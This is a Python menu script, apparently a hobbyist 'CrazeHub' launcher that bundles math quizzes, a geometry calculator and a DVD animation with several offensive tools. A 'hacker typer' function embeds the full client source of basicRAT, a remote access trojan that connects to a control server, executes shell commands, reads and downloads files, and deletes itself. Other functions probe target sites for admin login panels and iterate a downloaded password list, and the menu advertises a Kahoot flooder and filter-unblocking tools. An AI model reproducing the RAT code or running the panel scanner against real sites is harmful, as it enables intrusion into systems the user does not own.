def dvd_animation():
  import pygame, time
  pygame.init()
  width, height = 800,  600
  dvdLogoSpeed = [1, 1]
  backgroundColor = 0, 0, 0
  screen = pygame.display.set_mode((width, height))
  import shutil
  import requests
  url = "https://i.pinimg.com/originals/83/38/d4/8338d44ba689038d9a890a3d835e48e8.png"
  response = requests.get(url, stream=True)
  with open('dvd.png', 'wb') as file:
    shutil.copyfileobj(response.raw, file)
  del response  
  dvdLogo = pygame.image.load("dvd.png")
  dvdLogoRect = dvdLogo.get_rect()
  print("CTRL+C to exit")
  try:
   while True:
      screen.fill(backgroundColor)
      screen.blit(dvdLogo, dvdLogoRect)
      dvdLogoRect = dvdLogoRect.move(dvdLogoSpeed)
      if dvdLogoRect.left < 0  or dvdLogoRect.right > width:
	      dvdLogoSpeed[0] = -dvdLogoSpeed[0]
      if dvdLogoRect.top < 0  or dvdLogoRect.bottom > height:
	      dvdLogoSpeed[1] = -dvdLogoSpeed[1]
      pygame.display.flip()
      time.sleep(10 / 1000)
  except KeyboardInterrupt:
    os.remove("dvd.png")
    os.system("clear")
def hacker_typer():
  import curses, os, sys
  text = """
  #Import important libraries:
  import argparse
  import json
  import socket
  import sys
  import time
  from core import crypto, persistence, scan, survey, toolkit
  from __init__ import __version__
  #Determine system platform (pretty important):
  if sys.platform.startswith('win'):
    PLAT = 'win'
  elif sys.platform.startswith('linux'):
    PLAT = 'nix'
  elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
  else:
    sys.exit(1)
  def client_loop(conn, dhkey):
    while True:
        results = ''
        #Wait for server:
        data = crypto.decrypt(conn.recv(4096), dhkey)
        data = json.loads(data)
        cmd, action = data['command'], data['action']
        if cmd == 'kill':
            conn.close()
            return 1
        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)
        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break
        elif cmd == 'persistence':
            results = persistence.run(PLAT)
        elif cmd == 'scan':
            results = scan.single_host(action)
        elif cmd == 'survey':
            results = survey.run(PLAT)
        elif cmd == 'cat':
            results = toolkit.cat(action)
        elif cmd == 'execute':
            results = toolkit.execute(action)
        elif cmd == 'ls':
            results = toolkit.ls(action)
        elif cmd == 'pwd':
            results = toolkit.pwd()
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
        elif cmd == 'wget':
            results = toolkit.wget(action)
        results = results.rstrip() + '\n{} completed.'.format(cmd)
        data = { 'results': results }
        data = json.dumps(data)
        conn.send(crypto.encrypt(data, dhkey))
  def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT client')
    parser.add_argument('-i', '--ip', help='server ip',
                        default='127.0.0.1', type=str)
    parser.add_argument('-p', '--port', help='port to connect on',
                        default=1337, type=int)
    parser.add_argument('-t', '--timeout', help='reconnect interval',
                        default=30, type=int)
    parser.add_argument('-v', '--version', help='display the current version',
                        action='store_true')
    return parser
  def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    if args['version']:
        print('basicRAT %s' % __version__)
        return
    host = args['ip']
    port = args['port']
    timeout = args['timeout']
    exit_status = 0
    while True:
        conn = socket.socket()
        try:
            # attempt to connect to basicRAT server
            conn.connect((host, port))
        except socket.error:
            time.sleep(timeout)
            continue
        dhkey = crypto.diffiehellman(conn)
        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn, dhkey)
        except: pass
        if exit_status:
            sys.exit(0)
  if __name__ == '__main__':
    main()
  import os
  from Crypto import Random
  from Crypto.Cipher import AES
  from Crypto.Hash import SHA256
  from Crypto.Util.number import bytes_to_long, long_to_bytes
  def pad(s):
    return bytes(s, 'utf-8') + b'\0' * (AES.block_size - len(s) % AES.block_size)
  def encrypt(plaintext, key):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)
  def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0').decode('utf-8')
  #Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631:
  def diffiehellman(sock, bits=2048):
    #Using RFC 3526 MOPD group 14 (2048 bits):
    p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF;
    g = 2
    a = bytes_to_long(os.urandom(32)) # a 256bit number, sufficiently large
    xA = pow(g, a, p)
    sock.send(long_to_bytes(xA))
    b = bytes_to_long(sock.recv(256))
    s = pow(b, a, p)
    return SHA256.new(long_to_bytes(s)).digest()
  def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(4000)
        except IOError:
            return 'Error: Permission denied.'
    else:
        return 'Error: File not found.'
  def execute(command):
    output = subprocess.Popen(command, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
    result = output.stdout.read() + output.stderr.read()
    return result.decode('utf-8')
  def ls(path):
    if not path:
        path = '.'
    if os.path.exists(path):
        try:
            return '\n'.join(os.listdir(path))
        except OSError:
            return 'Error: Permission denied.'
    else:
        return 'Error: Path not found.'
  def pwd():
    return os.getcwd()
  def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass
    elif plat == 'nix':
        pass
    elif plat == 'mac':
        pass
    #Self delete basicRAT:
    os.remove(sys.argv[0])
    sys.exit(0)
  def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'
  def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'
    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)
    try:
        urllib.request.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'
    return 'File {} downloaded.'.format(fname)

 """

  myscreen = curses.initscr()
  curses.start_color()
  curses.noecho()
  curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
  char = 0
  myscreen.getch()
  for line in text:
    if char == 27:
        break
    for word in line:
        myscreen.addstr(word , curses.color_pair(1))
        myscreen.refresh()
        char = myscreen.getch()
        if char == 27:
            break
    myscreen.refresh()
  if char == 27:
    curses.endwin()
  else:
    while char != 27:
        char = myscreen.getch()
    curses.endwin()
def virtual_browser():
  import os, sys, time, random
  os.system("pip install webbot")
  import webbot
  class bcolors:
        GREEN = "\033[32m"
  typing_speed = 100 
  def slowprint(t):
    for l in t:
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/typing_speed)
    print ('')
  driver = webbot.Browser()
  driver.go_to('https://google.com')
  while True:
      print("What do you want to do?")
      print("1) Load a URL")
      print("2) Type something")
      print("3) Exit")
      choice = input('Unblocker >> ') 
      if choice == '1':
        CLINK = input('Enter a URL: ')
        print
        print(bcolors.GREEN)
        slowprint('Loading...')
        driver.go_to(CLINK)
        print
        print(bcolors.GREEN)
        slowprint('Finished')
      elif choice == '3':
        os.system("clear")
        import crazehub
      elif choice == '2':
        texttotype = input("What do you want to type?: ")
        print
        print(bcolors.GREEN)
        slowprint("Sending request...")
        driver.type(texttotype)
        print
        print(bcolors.GREEN)
        slowprint("Done")
      else:
        print("You didn't type 1, 2, or 3. You typed",'"',choice,'"')
def pnaclg():
  import phonenumbers
  rawnumber = input("Enter phone number: ")
  number = ("+1 "+rawnumber)
  print("Getting area code of "+number)
  from phonenumbers import geocoder
  ch_nmber = phonenumbers.parse(number, "CH")
  print("The area code of "+number +" is "+geocoder.description_for_number(ch_nmber, "en"))
def agmt():
  import os, random
  print("Ben's Math Test")
  print("")
  print('Difficulties:')
  print("1) Easy")
  print("2) Normal")
  print("3) Hard")
  diffchoice = input(">> ")
  if diffchoice == '1':
    os.system("clear")
    correctanswers = 0
    wronganswers = 0
    qstn = 0
    while qstn < 5:
      print("")
      qstn = qstn+1
      num1 = random.randint(5,15)
      num2 = random.randint(5,15)
      num1str = str(num1)
      num2str = str(num2)
      print("What is "+num1str+"+"+num2str+"?")
      answer = input(">> ")
      correctanswer = num1+num2
      answer = int(answer)
      if answer == correctanswer:
        print("Correct!")
        correctanswers = correctanswers+1
      else:
        print("Incorrect")
        wronganswers = wronganswers+1
    correctanswers = str(correctanswers)
    print("")
    print("---- QUIZ OVER ----")
    print("You got "+correctanswers+" out of 5")
  if diffchoice == '2':
    os.system("clear")
    correctanswers = 0
    wronganswers = 0
    qstn = 0
    while qstn < 5:
      print("")
      qstn = qstn+1
      num1 = random.randint(10,30)
      num2 = random.randint(10,30)
      num1str = str(num1)
      num2str = str(num2)
      print("What is "+num1str+"+"+num2str+"?")
      answer = input(">> ")
      correctanswer = num1+num2
      answer = int(answer)
      if answer == correctanswer:
        print("Correct!")
        correctanswers = correctanswers+1
      else:
        print("Incorrect")
        wronganswers = wronganswers+1
    correctanswers = str(correctanswers)
    print("")
    print("---- QUIZ OVER ----")
    print("You got "+correctanswers+" out of 5")
  if diffchoice == '3':
    os.system("clear")
    correctanswers = 0
    wronganswers = 0
    qstn = 0
    while qstn < 5:
      print("")
      qstn = qstn+1
      num1 = random.randint(4,12)
      num2 = random.randint(3,9)
      num1str = str(num1)
      num2str = str(num2)
      print("What is "+num1str+"x"+num2str+"?")
      answer = input(">> ")
      correctanswer = num1*num2
      answer = int(answer)
      if answer == correctanswer:
        print("Correct!")
        correctanswers = correctanswers+1
      else:
        print("Incorrect")
        wronganswers = wronganswers+1
    correctanswers = str(correctanswers)
    print("")
    print("---- QUIZ OVER ----")
    print("You got "+correctanswers+" out of 5")
def dwdg():
  import socket
  import re, uuid
  import sys
  import time
  import os
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("192.168.0.1", 80))
  print("Your Local IP: ", s.getsockname()[0], "\nPort:", s.getsockname()[1])
  # n
  external = (socket.getaddrinfo(socket.gethostname(), 80, proto=socket.IPPROTO_TCP))
  str1 = (str(external))
  str2 = str1.split(',')
  str3 = str2[4].split("(")
  print("Local IPv6:", str3[1])
  print("Host:", socket.gethostname())
  external2 = (socket.getaddrinfo("sololearn.com", 80, proto=socket.IPPROTO_TCP))
  s1 = (str(external2))
  s2 = s1.split(',')
  s3 = s2[4].split("(")
  print("Your Server IP:", s3[1])
  external3 = (socket.getaddrinfo("ident.me", 80, proto=socket.IPPROTO_TCP))
  s11 = (str(external3))
  s22 = s11.split(',')
  s33 = s22[4].split("(")
  print("Device External IP:", s33[1])
  s.close()
  print("")
  choice = input("Press enter to go back to the script list")
  import crazehub
def piglatin_translator():
  exited = False
  while exited == False:
    os.system("clear")
    raw = input("Translate >> ")
    lastsection = ((raw[:1])+"ay")
    mainpart = (raw[1:])
    translated = mainpart+lastsection
    print("Translated:",translated)
    print("")
    print('Enter 1 to exit or press enter to translate again')
    input_ = input(">> ")
    if input_ == '1':
      exited = True
    else:
      exited = False
def hypocalc():
  import math, os
  os.system("clear")
  print("Enter 1 to solve for side A or B")
  print("Or enter 2 to solve for the hypotenuse") 
  aorhypo = input(">> ")
  if aorhypo == '1':
      print("")
      print("Enter 1 to solve with the side lengths")
      print("Or enter 2 to solve with the areas")
      areaorside1 = input(">> ")
      if areaorside1 == '1':
          print("")
          hypo = float(input("Enter the side length of the hypotenuse: "))
          aorb = float(input("Enter the length of A/B (whichever you have): "))
          hypoarea = hypo*hypo
          aorbarea = aorb*aorb
          areaanswer = hypoarea-aorbarea
          sidelengthanswer = math.sqrt(areaanswer)
          print("")
          print("The area of A or B is",areaanswer,"and the side length is",sidelengthanswer)
          print("")
          input("Press enter to go back to the script list")
          import crazehub
      elif areaorside1 == '2':
          print("")
          hypoarea = float(input("Enter the area of the hypotenuse: "))
          aorbarea = float(input("Enter the area of A/B (whichever you have): "))
          areaanswer = hypoarea-aorbarea
          sidelengthanswer = math.sqrt(areaanswer)
          print("")
          print("The area of A or B is",areaanswer,"and the side length is",sidelengthanswer)
          print("")
          input("Press enter to go back to the script list")
          import crazehub
      else: 
        print("ERROR")
  elif aorhypo == '2':
      print("")
      print("Enter 1 to solve with the side lengths")
      print("Or enter 2 to solve with the areas")
      areaorside1 = input(">> ")
      if areaorside1 == '1':
          print("")
          a = float(input("Enter the side length of side A: "))
          b = float(input("Enter the side length of side B: "))
          asquared = a*a
          bsquared = b*b
          areaanswer = asquared+bsquared
          sidelengthanswer = math.sqrt(areaanswer)
          print("")
          print("The area of the hypotenuse is",areaanswer,"and the side length is",sidelengthanswer)
          print("")
          input("Press enter to go back to the script list")
          import crazehub
      elif areaorside1 == '2':
          print("")
          Aarea = float(input("Enter the area of side A: "))
          Barea = float(input("Enter the area of side B: "))
          areaanswer = Aarea+Barea
          sidelengthanswer = math.sqrt(areaanswer)
          print("")
          print("The area of the hypotenuse is",areaanswer,"and the side length is",sidelengthanswer)
          print("")
          input("Press enter to go back to the script list")
          import crazehub
      else:
        print("ERROR")
  else:
   print("ERROR")
def geometry_calculator():
  import os
  import time
  while True:
   print("")
   input("Press enter to view equations")
   os.system("clear")
   print("--------- Volume -----------")
   print("1) Volume of a Sphere")
   print("2) Volume of a Cylinder")
   print("3) Volume of a Pyramid")
   print("4) Volume of a Cone")
   print("5) Volume of a Prism")
   print("")
   print("-- Surface & Lateral Area --")
   print("6) Surface area of a Sphere")
   print("7) Surface area of a Cylinder")
   print("8) Lateral Area of a Cylinder")
   print("9) Lateral Area of a Prism")
   print("10) Surface Area of a Prism")
   print("")
   print("----------- Area -----------")
   print("11) Area of a Triangle")
   print("12) Area of a Circle")
   print("13) Area of a Rectangle or Parallelogram")
   print("14) Area of a Trapezoid")  
   print("")
   print("---------- Other -----------")
   print("15) Circumference of a circle")
   print("")
   print("Enter the number that is to the left of the equation you want to load")
   print('Enter "exit" without the quotes to exit')
   scc = input(">> ")
   os.system("clear")
   if scc == '1': # Volume of sphere
    r = int(input("Enter the radius: "))
    r3 = int(r*r*r)
    volume = (((r3*3.14)/3)*4)
    print('Answer:',volume, "units cubed")
   elif scc == '6': # Surface Area of Sphere
    r = int(input("Enter the radius: "))
    r2 = (r*r)
    sa = ((r2*3.14)*4)
    print("Answer:",sa,"units squared")
   elif scc == '2': # Volume of a Cylinder
    h = int(input("Enter the height: "))
    r = int(input("Enter the radius: "))
    r2 = r*r
    volume = (3.14*r2*h)  
    print("Answer:",volume,"units cubed")
   elif scc == '7': # Surface Area of a Cylinder
    r = int(input("Enter the radius: "))
    h = int(input('Enter the height: '))
    r2 = (r*r)
    fp = (2*(3.14*r2))
    sp = (2*(3.14*r*h))
    sa = fp+sp
    print("Answer:",sa,"units squared")
   elif scc == '8': # Lateral Area of a Cylinder
    r = int(input("Enter the radius: "))
    h = int(input("Enter the height: "))
    la = (2*(3.14*r*h))
    print("Answer:",la,"lateral area")
   elif scc == '3': # Volume of a Pyramid
    h = int(input("Enter the height: "))
    bl = int(input("Enter the base length: "))
    bw = int(input("Enter the base width: "))
    ba = bw*bl
    volume = ((ba*h)/3)
    print("Answer:",volume,"units cubed")
   elif scc == '4': # Volume of a Cone
    r = int(input("Enter the radius: "))
    h = int(input("Enter the height: "))
    r2 = r*r
    volume = (3.14*(r2*(h/3)))
    print("Answer:",volume,"units cubed")
   elif scc == '15': # Circumference of a circle
    d = int(input("Enter the Diameter: "))
    c = d*3.14
    print("Answer:",c,'is the circumference')
   elif scc == '11':# Area of a Triangle
    b = int(input("Enter the base: "))
    h = int(input("Enter the height: "))
    a = ((b*h)/2)
    print('Answer:',a,"units squared")
   elif scc == '12':# Area of a Circle
    r = int(input("Enter the radius: "))
    a = (3.14*(r*r))
    print("Answer:",a,"units squared")
   elif scc == '13':# Area of a Rectangle/Parallelogram
    b = int(input("Enter the base: "))
    h = int(input("Enter the height: "))
    a = b*h
    print("Answer:",a,"units squared")
   elif scc == '14':# Area of a trapezoid
    h = float(input("Enter the height: "))
    b1 = float(input("Enter the first base: "))
    b2 = float(input("Enter the second base: "))
    a = (b1+b2)*h/2
    print("Answer:",a,"units squared")
   elif scc == '5':# Volume of a Prism
    h = int(input("Enter the height: "))
    l = int(input("Enter the base length: "))
    w = int(input("Enter the base width: "))
    v = (h*(l*w))
    print("Answer:",v,"units squared")
   elif scc == '9':# Lateral Area of a Prism
      h = int(input("Enter the height: "))
      P = int(input("Enter the base perimeter: "))
      la = P*h
      print("Answer:",la,"units squared")
   elif scc == '10':# Surface Area of a Prism
      h = int(input("Enter the height: "))
      P = int(input("Enter the base perimeter: "))
      b = int(input("Enter the base area: "))
      B = b*2
      la = P*h+B
      print("Answer:",la,"units squared")
   elif scc == 'exit' or scc == 'EXIT':
      import crazehub
   else: 
    os.system('clear')
    time.sleep(.7)
    print("")
    print("You didn't enter a number corresponding to an equation.")
    print("-------------------------------------------------------")
    time.sleep(1)
def password_cracker():
  import sys, time, random, os
  import urllib.request
  passwords = urllib.request.urlopen('https://raw.githubusercontent.com/Craexz/pswdlist/main/pswdlist')
  typing_speed = 90 # wpm
  def slowprint(sentence):
    for char in sentence:
      sys.stdout.write(char)
      sys.stdout.flush()
      time.sleep(random.random()*10.0/typing_speed)
  try_ = 0
  lines = 10000
  correct_password = input("Enter password to crack >> ")
  for password in passwords:
      try:
        password = (password.decode().strip())
        try_ = try_+1
        try_str = str(try_)
        lines_str = str(lines)
        password_str = str(password)
        password_str = password_str.replace("b", "").replace("'", "").replace("n", "")
        print("Tries --> "+try_str+"/"+lines_str+" | Current password --> "+password_str)
        if password == correct_password:
          print("")
          print("Password found:", end = " ")
          slowprint(password)
          print("")
          sys.exit(0)
      except KeyboardInterrupt:
        os.system("clear")
        slowprint("[X] - Keyboard interrupt. stopping...")
        print("")
        sys.exit(0)
def encryption_and_decryption():
 import base64
 def encode():
  text = input("Text to encode: ")
  text_bytes = text.encode('ascii')
  base64_bytes = base64.b64encode(text_bytes)
  text_message = base64_bytes.decode('ascii')
  print('Encoded:',text_message)
 def decode():
  text = input("Text to decode: ")
  text_bytes = text.encode('ascii')
  decoded_bytes = base64.b64decode(text_bytes)
  decoded = decoded_bytes.decode('ascii')
  print("Decoded:",decoded)
 def start():
  import time
  import os
  help_msg = 'To decode: init decode | To encode: init encode'
  note = '(This tool only supports lowercase letters)'
  decode_cmd = 'init decode'
  encode_cmd = 'init encode'
  print(note)
  print(help_msg)
  print("-----------------------------------------------")
  input_ = input(">> ")
  if input_ == decode_cmd:
    decode()
  elif input_ == encode_cmd:
    encode()
  else:
    input_ = '"'+input_+'"'
    print("Unknown command",input_,"| Please try again.")
    time.sleep(2)
    os.system("clear")
    start()
 start()
def lpf():
 import requests
 import sys, os
 from time import sleep
 def main():
    url = input(" Enter your target url: ")  # Get target url from user
    if not "http://" in url or not "https://" in url:
      url = "http://"+url
    start = "Scanning, please wait...\n"
    for s in start:
        sys.stdout.write(s)
        sys.stdout.flush()
        sleep(0.1)
    import urllib.request
    passwords = urllib.request.urlopen('https://raw.githubusercontent.com/Craexz/loginpanellist/main/loginpanellist')  # Open files containing possible admin directories
    failed = 0
    worked = 0
    try:
        for link in passwords:
            link = (link.decode().strip())
            curl = url + link
            res = requests.get(curl)
            if res.status_code == 200:
                print("")
                print("-" * 60)
                print("Login panel found ==> {}".format(curl))
                print("-" * 60)
                print("")
                worked = worked+1
            else:
                failed = failed+1
        print("")
        print("Scan done!",failed,"scans failed.",worked,"scans were successful.")
    except KeyboardInterrupt:
        print("Shutdown request.",failed,"scans failed.",worked,"scans were successful.")
        print
    file.close()
    input("Press enter to go back to the script list")
    import crazehub
 main()

class colors:
 magenta = '\033[35m'
 cyan    = '\033[36m'
import sys
math_words = ['add','addend','addition','angle','answer','area','arithmetic','average','axis','billion','binary','calculate','cardinal','carry','circle','circumference','compass','cone','coordinates','cosine','counting','cube','curve','cylinder','decimal','degree','denominator','diameter','difference','divide','division','divisor','dozen','eight','eighteen','eighty','eleven','ellipse','equal','equation','equilateral','even','exponent','expression','factor','factorial','fifteen','fifty','five','focus','formula','forty','four','fourteen','fraction','geometry','graph','greater','greater than','half','hundred','hundredth','hyperbola','hypotenuse','identity','imaginary','inequality','integer','intersection','inverse','irrational','number','isosceles','kilo','less','less than','line','linear','long division','math','mathematician','mathematics','mean','median','million','minus','modular','multiplicand','multiply','nano','negative','nine','nineteen','ninety','null','number','number line','numeral','numerator','numerical','obtuse','octagon','odd','one','operation','orb','ordinal','origin','oval','parabola','parallel','parallelogram','percent','perimeter','perpendicular','pi','plane','plot','plus','point','polygon','polyhedron','polynomial','power','prime number','product','proof','protractor','pyramid','Q.E.D.','quadratic','quadrilateral','quarter','quotient','radian','radius','rational number','ray','real number','rectangle','remainder','rhombus','right angle','rounded','scientific notation','series','set','seven','seventeen','seventy','sine','six','sixteen','sixty','skip counting','slope','solve','sphere','square','square root','subtract','subtrahend','sum','symbol','symmetry','tangent','tententh','thirteen','thirty','thousand','thousand','three','times','torus','trapezoid','triangle','trillion','twelve','twenty','two','union','unit','variable','Venn diagram','vertex','volume','whole number','x-axis','x-coordinate', 'y-axis','y-coordinate','zero']


import time, sys, random
typing_speed = 90 # wpm
def slowprint(sentence):
   for char in sentence:
     sys.stdout.write(char)
     sys.stdout.flush()
     time.sleep(random.random()*10.0/typing_speed)
   print("")
slowprint("Installing modules")
import time, sys, os
os.system("clear")
slowprint("Checking system integrity...")
print("SYSTEM:",sys.platform)
time.sleep(.7)
os.system("clear")
slowprint('Done! Loading script...')
os.system("clear")
print(colors.cyan)
print("""


  █████╗ ██████╗  █████╗ ███████╗███████╗  ██╗  ██╗██╗   ██╗██████╗
 ██╔══██╗██╔══██╗██╔══██╗╚════██║██╔════╝  ██║  ██║██║   ██║██╔══██╗
 ██║  ╚═╝██████╔╝███████║  ███╔═╝█████╗    ███████║██║   ██║██████╦╝
 ██║  ██╗██╔══██╗██╔══██║██╔══╝  ██╔══╝    ██╔══██║██║   ██║██╔══██╗
 ╚█████╔╝██║  ██║██║  ██║███████╗███████╗  ██║  ██║╚██████╔╝██████╦╝
  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝

""")
print("")
print(colors.magenta)
print("All scripts: ")
print("")
print("(CTRL+C to exit)")
s1 = "hypotenuse-calculator"
print("1)",s1)
s2 = "unblocking-guide"
print("2)",s2)
s3 = "login-panel-finder"
print("3)",s3)
s4 = "proxy-site"
print("4)",s4) 
s5 = "kahoot-flooder"
print("5)",s5)
s6 = "device-wifi-detail-getter"
print("6)",s6)
s7 = "proxy-detector"
print("7)",s7)
s8 = "virtual-browser"
print("8)",s8)
s9 = "password-cracker"
print("9)",s9)
s10 = "hacker-typer"
print("10)",s10)
s11 = "phone-number-area-code-location-getter"
print("11)",s11)
s12 = "piglatin-translator"
print("12)",s12)
s13 = "auto-generated-math-test"
print("13)",s13)
s14 = "dvd-animation"
print("14)",s14)
s15 = "encryption-and-decryption"
print("15)",s15)
s16 = "geometry-calculator"
print("16)",s16)
print('Enter "S" without the quotes to search for a script')
try:
 schoice = input(">> ")
except KeyboardInterrupt:
  os.system("clear")
  slowprint("[X] - Keyboard interrupt, exiting...")
  sys.exit(0)
  
if schoice == '1':
  os.system("clear")
  print(s1+':')
  print('Link:','https://repl.it/@Craexz/'+s1+'/')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    hypocalc()
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '2':
  os.system("clear")
  print(s2+':')
  print('Link:','https://'+s2+'.craexz.repl.co')
  print("")
  choice = input("Press enter to go back to the script list")
  os.system("clear")
  import crazehub
if schoice == '3':
  os.system("clear")
  print(s3+':')
  print('Link:','https://repl.it/@Craexz/'+s3)
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    os.system("clear")
    lpf()
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '4':
  os.system("clear")
  print(s4+':')
  print('Link:','https://'+s4+'.craexz.repl.co')
  print("")
  input("Press enter to go back to the script list")
  import crazehub
if schoice == '5':
  os.system("clear")
  print(s5+':')
  print('Link:','https://'+s5+'.craexz.repl.co')
  print("")
  input("Press enter to go back to the script list")
if schoice == '6':
  os.system("clear")
  print(s6+':')
  print('Link:','https://'+s6+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    os.system("clear")
    dwdg()
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '7':
  os.system("clear")
  print(s7+':')
  print('Link:','https://repl.it/@Craexz/'+s7+'/')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    os.system("clear")
    import scripts.proxydetecter
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '8':
  os.system("clear")
  print(s8+':')
  print('Link:','https://repl.it/@craexz/'+s8+'/')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    os.system("clear")
    virtual_browser()
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '9':
  os.system("clear")
  print(s9+':')
  print('Link:','https://'+s9+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    os.system("clear")
    password_cracker()
  elif choice == '2':
    os.system("clear")
    import crazehub    
if schoice == '10':
  os.system("clear")
  print(s10+':')
  print('Link:','https://'+s10+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    hacker_typer()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '11':
  os.system("clear")
  print(s11+':')
  print('Link:','https://'+s11+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    pnaclg()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '12':
  os.system("clear")
  print(s12+':')
  print('Link:','https://'+s12+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    piglatin_translator()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '13':
  os.system("clear")
  print(s13+':')
  print('Link:','https://'+s13+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    agmt()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '14':
  os.system("clear")
  print(s14+':')
  print('Link:','https://'+s14+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    dvd_animation()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '15':
  os.system("clear")
  print(s15+':')
  print('Link:','https://'+s15+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    encryption_and_decryption()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub
if schoice == '16':
  os.system("clear")
  print(s16+':')
  print('Link:','https://'+s16+'.craexz.repl.co')
  print("")
  print("1) Run the script directly")
  print("2) Go back to the script list")
  choice = input(">> ")
  if choice == '1':
    geometry_calculator()
    os.system("")
  elif choice == '2':
    os.system("clear")
    import crazehub    
if schoice == 'S' or schoice == 's':
  os.system("clear")
  print("SEARCH FOR A SCRIPT")
  query = input(">> ")
  if query in math_words:
    print("")
    print("--- Math Keyword Detected in Search ---")
    print("")
    print("Math related scripts:")
    print(" Enter 16 for the geometry calculator")
    print(" Enter 1 for the hypotenuse calculator")
    mathscriptchoice = input(">> ")
    if mathscriptchoice == '16':
      os.system("clear")
      print(s16+':')
      print('Link:','https://'+s16+'.craexz.repl.co')
      print("")
      print("1) Run the script directly")
      print("2) Go back to the script list")
      choice = input(">> ")
      if choice == '1':
        os.system("python scripts/geometry-calculator.py")
        os.system("")
      elif choice == '2':
        os.system("clear")
        import crazehub
    if mathscriptchoice == '1':
      os.system("clear")
      print(s1+':')
      print('Link:','https://repl.it/@Craexz/'+s1+'/')
      print("")
      print("1) Run the script directly")
      print("2) Go back to the script list")
      choice = input(">> ")
      if choice == '1':
        import scripts.hypocalc
      elif choice == '2':
        os.system("clear")
        import crazehub





    


